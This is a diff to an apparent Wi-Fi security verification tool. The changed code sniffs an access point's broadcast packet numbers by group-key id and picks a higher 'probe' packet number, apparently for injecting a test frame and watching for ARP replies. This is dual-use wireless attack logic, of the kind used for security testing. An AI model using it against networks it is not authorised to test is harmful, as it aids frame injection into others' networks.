@@ -348,18 +348,33 @@ def do_verify(args, *, mon_iface: str, atexit_state: dict) -> int:
                   f"for {args.pn_sample_window:.1f}s...")
             time.sleep(args.pn_sample_window)
             with sniff_lock:
-                ap_pn = sniff_state["ap_pn_seen"] or None
-            if ap_pn is None:
+                our_keyid_pn = sniff_state["ap_pn_seen"] or None
+                pn_by_keyid = dict(sniff_state.get("ap_pn_by_keyid", {}))
+
+            keyid_summary = (
+                ", ".join(f"k{k}=0x{v:x}"
+                          for k, v in sorted(pn_by_keyid.items()))
+                or "none")
+            print(f"[+] AP broadcasts by keyid: {keyid_summary} "
+                  f"(our gtk_idx={keys.gtk_idx})")
+
+            # Floor against the AP's PN under our keyid AND under any
+            # other keyid the sniffer saw. The "any" path is what
+            # rescues the run when the AP rotated keys at association
+            # time and is currently broadcasting under a keyid our
+            # supplicant didn't capture.
+            max_any_keyid = max(pn_by_keyid.values(), default=0)
+            if our_keyid_pn is not None or max_any_keyid > 0:
+                base = max(our_keyid_pn or 0, max_any_keyid)
+                probe_pn = base + args.pn_offset
+                print(f"[+] Floor: highest AP PN seen = 0x{base:x}; "
+                      f"probe PN=0x{probe_pn:x} (offset=0x{args.pn_offset:x}).")
+            else:
                 probe_pn = max(_SAFE_HIGH_PN, args.pn_offset)
-                print(f"[+] No AP broadcasts seen; using fallback "
-                      f"PN=0x{probe_pn:x} "
+                print(f"[+] No AP broadcasts seen on any keyid; using "
+                      f"fallback PN=0x{probe_pn:x} "
                       f"(max of safe-high 0x{_SAFE_HIGH_PN:x} and "
                       f"--pn-offset 0x{args.pn_offset:x}).")
-            else:
-                probe_pn = ap_pn + args.pn_offset
-                print(f"[+] AP last broadcast PN=0x{ap_pn:x}; "
-                      f"probe PN=0x{probe_pn:x} "
-                      f"(offset=0x{args.pn_offset:x}).")
 
             watcher = ArpReplyWatcher(args.iface, our_mac)
             watcher.start()
